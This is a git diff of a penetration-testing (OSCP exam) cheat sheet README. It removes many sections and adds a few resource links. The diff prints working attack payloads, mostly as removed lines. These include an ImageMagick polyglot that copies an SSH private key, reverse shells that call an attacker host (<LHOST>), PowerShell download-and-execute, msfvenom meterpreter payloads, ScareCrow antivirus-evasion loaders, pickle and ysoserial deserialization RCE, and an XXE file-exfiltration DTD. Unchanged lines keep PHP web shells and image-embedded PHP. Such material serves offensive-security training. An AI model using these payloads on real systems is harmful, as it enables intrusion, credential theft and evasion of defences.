@@ -40,7 +40,6 @@ Thank you for reading.
 - [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis)
 - [Database Assessment](https://github.com/0xsyr0/OSCP#database-assessment)
 - [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks)
-- [Reverse Engineering](https://github.com/0xsyr0/OSCP#reverse-engineering)
 - [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools)
 - [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation)
 - [Exploit Databases](https://github.com/0xsyr0/OSCP#exploit-databases)
@@ -119,8 +118,6 @@ Thank you for reading.
   		- [NetExec](https://github.com/0xsyr0/OSCP#NetExec)
 		- [pypykatz](https://github.com/0xsyr0/OSCP#pypykatz)
 	- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools-1)
-		- [ImageTragick](https://github.com/0xsyr0/OSCP#imagetragick)
-		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
 		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
  		- [Active Directory Certificate Services (AD CS)](https://github.com/0xsyr0/OSCP#active-directory-certificate-services-ad-cs)
@@ -174,24 +171,12 @@ Thank you for reading.
 		- [SharpEfsPotato LPE](https://github.com/0xsyr0/OSCP#sharpefspotato-lpe)
 		- [Shocker Container Escape](https://github.com/0xsyr0/OSCP#shocker-container-escape)
 	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
-		- [Donut](https://github.com/0xsyr0/OSCP#donut)
 		- [Exiftool](https://github.com/0xsyr0/OSCP#exiftool)
-		- [GhostScript](https://github.com/0xsyr0/OSCP#ghostscript)
-		- [nishang](https://github.com/0xsyr0/OSCP#nishang)
 		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
-		- [ScareCrow](https://github.com/0xsyr0/OSCP#scarecrow)
-		- [Shikata Ga Nai](https://github.com/0xsyr0/OSCP#shikata-ga-nai)
 		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
-		- [ysoserial](https://github.com/0xsyr0/OSCP#ysoserial)
 	- [Templates](https://github.com/0xsyr0/OSCP#templates)
 		- [ASPX Web Shell](https://github.com/0xsyr0/OSCP#aspx-web-shell)
 		- [Bad YAML](https://github.com/0xsyr0/OSCP#bad-yaml)
-		- [Exploit Skeleton Python Script](https://github.com/0xsyr0/OSCP#exploit-skeleton-python-script)
-		- [JSON POST Rrequest](https://github.com/0xsyr0/OSCP#json-post-request)
-		- [Python Pickle RCE](https://github.com/0xsyr0/OSCP#python-pickle-rce)
-		- [Python Redirect for SSRF](https://github.com/0xsyr0/OSCP#python-redirect-for-ssrf)
-		- [Python Web Request](https://github.com/0xsyr0/OSCP#python-web-request)
-		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)
 
 ### Basics
 
@@ -199,6 +184,7 @@ Thank you for reading.
 | --- | --- |
 | Chisel | https://github.com/jpillora/chisel |
 | CyberChef | https://gchq.github.io/CyberChef |
+| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
 | Swaks | https://github.com/jetmore/swaks |
 
 ### Information Gathering
@@ -231,7 +217,6 @@ Thank you for reading.
 | Wfuzz | https://github.com/xmendez/wfuzz |
 | WhatWeb | https://github.com/urbanadventurer/WhatWeb |
 | WPScan | https://github.com/wpscanteam/wpscan |
-| ysoserial | https://github.com/frohoff/ysoserial |
 
 ### Database Assessment
 
@@ -262,30 +247,12 @@ Thank you for reading.
 | RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
 | SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |
 
-### Reverse Engineering
-
-| Name | URL |
-| --- | --- |
-| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
-| binwalk | https://github.com/ReFirmLabs/binwalk |
-| cutter | https://github.com/rizinorg/cutter |
-| dnSpy | https://github.com/dnSpy/dnSpy |
-| GEF | https://github.com/hugsy/gef |
-| ghidra | https://github.com/NationalSecurityAgency/ghidra |
-| ImHex | https://github.com/WerWolv/ImHex |
-| JD-GUI | https://github.com/java-decompiler/jd-gui |
-| peda | https://github.com/longld/peda |
-| pwndbg | https://github.com/pwndbg/pwndbg |
-| Radare2 | https://github.com/radareorg/radare2 |
-
 ### Exploitation Tools
 
 | Name | URL |
 | --- | --- |
 | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
-| ImageTragick | https://imagetragick.com |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
-| MSL / Polyglot Attack | https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html |
 
 ### Post Exploitation
 
@@ -337,7 +304,6 @@ Thank you for reading.
 | SharpHound | https://github.com/BloodHoundAD/SharpHound |
 | SharpView | https://github.com/tevora-threat/SharpView |
 | Sherlock | https://github.com/rasta-mouse/Sherlock |
-| Villain | https://github.com/t3l3machus/Villain |
 | WADComs | https://wadcoms.github.io |
 | Watson | https://github.com/rasta-mouse/Watson |
 | WESNG | https://github.com/bitsadmin/wesng
@@ -471,29 +437,13 @@ Thank you for reading.
 
 | Name | URL |
 | --- | --- |
-| AMSI.fail | http://amsi.fail |
-| Donut | https://github.com/TheWover/donut |
-| Freeze | https://github.com/optiv/Freeze |
-| hoaxshell | https://github.com/t3l3machus/hoaxshell |
-| Invoke-Obfuscation | https://github.com/danielbohannon/Invoke-Obfuscation |
-| marshalsec | https://github.com/mbechler/marshalsec |
-| nishang | https://github.com/samratashok/nishang |
 | Payload Box | https://github.com/payloadbox |
 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | phpgcc | https://github.com/ambionics/phpggc |
 | PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
 | PowerLine | https://github.com/fullmetalcache/powerline |
-| PowerShell Encoder (CyberChef) | [Receipe for encoding PowerShell Payloads for Windows](https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')) |
-| Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
-| ScareCrow | https://github.com/optiv/ScareCrow |
-| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
-| unicorn | https://github.com/trustedsec/unicorn |
-| Veil | https://github.com/Veil-Framework/Veil |
 | webshell | https://github.com/tennc/webshell |
 | Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
-| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
-| ysoserial | https://github.com/frohoff/ysoserial |
-| ysoserial.net | https://github.com/pwntester/ysoserial.net |
 
 ### Wordlists
 
@@ -510,12 +460,13 @@ Thank you for reading.
 
 | Name | URL |
 | --- | --- |
+| OSCP Guide 01/12 – My Exam Experience | https://www.youtube.com/watch?v=9mrf-WyzkpE&list=PLJnLaWkc9xRgOyupMhNiVFfgvxseWDH5x |
+| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
+| HackTricks | https://book.hacktricks.xyz/ |
+| Hacking Articles | https://www.hackingarticles.in/ |
 | IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
 | IppSec.rocks | https://ippsec.rocks/?# |
 | 0xdf | https://0xdf.gitlab.io/
-| HackTricks | https://book.hacktricks.xyz/ |
-| Hacking Articles | https://www.hackingarticles.in/ |
-| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
 
 ## Commands
 
@@ -2595,33 +2546,6 @@ pypykatz registry --sam sam system
 ```
 
 ### Exploitation Tools
-
-#### ImageTragick
-
-> https://imagetragick.com/
-
-#### MSL / Polyglot Attack
-
-> https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
-
-##### poc.svg
-
-```c
-<image authenticate='ff" `echo $(cat /home/<USERNAME>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
-  <read filename="pdf:/etc/passwd"/>
-  <get width="base-width" height="base-height" />
-  <resize geometry="400x400" />
-  <write filename="test.png" />
-  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="msl:poc.svg" height="100" width="100"/>
-  </svg>
-</image>
-```
-
-```c
-convert poc.svg poc.png
-cp /tmp/poc.svg /var/www/html/convert_images/
-```
 
 #### Metasploit
 
@@ -5242,12 +5166,6 @@ cc -Wall -std=c99 -O2 shocker.c -static
 
 ### Payloads
 
-#### Donut
-
-```c
-donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
-```
-
 #### Exiftool
 
 ##### PHP into JPG Injection
@@ -5257,34 +5175,6 @@ exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
 exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
 exiftool "-comment<=back.php" back.png
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
-```
-
-#### GhostScript
-
-```c
-%!PS-Adobe-3.0 EPSF-3.0
-%%BoundingBox: -0 -0 100 100
-userdict /setpagedevice undef
-save
-legal
-{ null restore } stopped { pop } if
-{ legal } stopped { pop } if
-restore
-mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
-```
-
-#### nishang
-
-```c
-cd path/to/nishang/Shells/
-cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
-
-tail -3 Invoke-PowerShellTcp.ps1
-}
-
-Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
-
-powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
 ```
 
 #### Reverse Shells
@@ -5487,76 +5377,6 @@ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,sock
 ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-#### ScareCrow
-
-##### Payloads
-
-###### Shellcode Payload Creation with msfvenom
-
-```c
-msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
-```
-
-###### .msi-File Payload Creation with msfvenom
-
-```c
-msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
-```
-
-##### Listener
-
-```c
-msf6 > use exploit/multi/handler
-msf6 > set payload windows/x64/meterpreter/reverse_https
-```
-
-##### Obfuscation
-
-###### DLL Side-Loading
-
-```c
-ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
-```
-###### Windows Script Host
-
-```c
-ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
-```
-
-###### Control Panel Files
-
-```c
-ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
-```
-
-##### Renaming Payload
-
-```c
-mv <FILE>.dll <FILE>32.dll
-```
-
-##### Execution
-
-```c
-rundll32.exe .\<FILE>32.dll,DllRegisterServer
-```
-
-or
-
-```c
-regsvr32 /s .\<FILE>32.dll
-```
-
-For `.cpl-Files` a simple double click is enough to execute them.
-
-#### Shikata Ga Nai
-
-```c
-msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
-
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
-```
-
 #### Web Shells
 
 ##### PHP Web Shell
@@ -5567,15 +5387,6 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LP
 <?php echo passthru($_GET['cmd']); ?>
 <?php passthru($_REQUEST['cmd']); ?>
 <?php echo system($_REQUEST['shell']): ?>
-```
-
-#### ysoserial
-
-```c
-java -jar ysoserial-master-SNAPSHOT.jar
-java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <LHOST> <LPORT> -e /bin/sh' | base64 -w 0
-java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
-java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
 ```
 
 ### Templates
@@ -5618,194 +5429,4 @@ Response.write(o)
   tasks:
     - name: badyml
       command: chmod +s /bin/bash
-```
-
-#### Exploit Skeleton Python Script
-
-```c
-#!/usr/bin/python
-
-import socket,sys
-
-address = '127.0.0.1'
-port = 9999
-buffer = #TBD
-
-try:
-	print '[+] Sending buffer'
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((address,port))
-	s.recv(1024)
-	s.send(buffer + '\r\n')
-except:
- 	print '[!] Unable to connect to the application.'
- 	sys.exit(0)
-finally:
-	s.close()
-```
-
-#### JSON POST Request
-
-```c
-POST /<path> HTTP/1.1
-Host: <RHOST>
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Content-Type: application/json
-Content-Length: 95
-Connection: close
-
-{
-  "auth":{
-    "name":"<USERNAME>",
-    "password":"<PASSWORD>"
-  },
-  "filename":"<FILE>"
-}
-```
-
-#### Python Pickle RCE
-
-```python
-import pickle
-import sys
-import base64
-
-command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> <LHOST> > /tmp/f'
-
-class rce(object):
-    def __reduce__(self):
-        import os
-        return (os.system,(command,))
-
-print(base64.b64encode(pickle.dumps(rce())))
-```
-
-```python
-import base64
-import pickle
-import os
-
-class RCE:
-	def __reduce__(self):
-		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
-		return = os.system, (cmd, )
-
-if __name__ == '__main__':
-	pickle = pickle.dumps(RCE())
-	print(bas64.b64encode(pickled))
-```
-
-#### Python Redirect for SSRF
-
-```python
-#!/usr/bin/python3
-import sys
-from http.server import HTTPServer, BaseHTTPRequestHandler
-
-class Redirect(BaseHTTPRequestHandler):
-  def do_GET(self):
-      self.send_response(302)
-      self.send_header('Location', sys.argv[1])
-      self.end_headers()
-
-HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
-```
-
-```c
-sudo python3 redirect.py http://127.0.0.1:3000/
-```
-
-```python
-#!/usr/bin/env python
-
-import SimpleHTTPServer
-import SocketServer
-import sys
-import argparse
-
-def redirect_handler_factory(url):
-    """
-    returns a request handler class that redirects to supplied `url`
-    """
-    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
-       def do_GET(self):
-           self.send_response(301)
-           self.send_header('Location', url)
-           self.end_headers()
-
-       def do_POST(self):
-           self.send_response(301)
-           self.send_header('Location', url)
-           self.end_headers()
-
-    return RedirectHandler
-
-
-def main():
-
-    parser = argparse.ArgumentParser(description='HTTP redirect server')
-
-    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
-    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
-    parser.add_argument('redirect_url', action="store")
-
-    myargs = parser.parse_args()
-
-    redirect_url = myargs.redirect_url
-    port = myargs.port
-    host = myargs.ip
-
-    redirectHandler = redirect_handler_factory(redirect_url)
-
-    handler = SocketServer.TCPServer((host, port), redirectHandler)
-    print("serving at port %s" % port)
-    handler.serve_forever()
-
-if __name__ == "__main__":
-    main()
-```
-
-#### Python Web Request
-
-```python
-import requests
-import re
-
-http_proxy  = "http://127.0.0.1:8080"
-proxyDict = {
-              "http"  : http_proxy,
-            }
-// get a session
-r = requests.get('http://')
-// send request
-r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
-```
-
-#### XML External Entity (XXE)
-
-##### Request
-
-```c
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
-"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
-<root>
-<method>GET</method>
-<uri>/</uri>
-<user>
-<username><NAME>;</username>
-<password><NAME></password>
-</user>
-</root>
-```
-
-##### Content of <FILE>.dtd
-
-```c
-<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
-%eval;
-%exfiltrate;
 ```
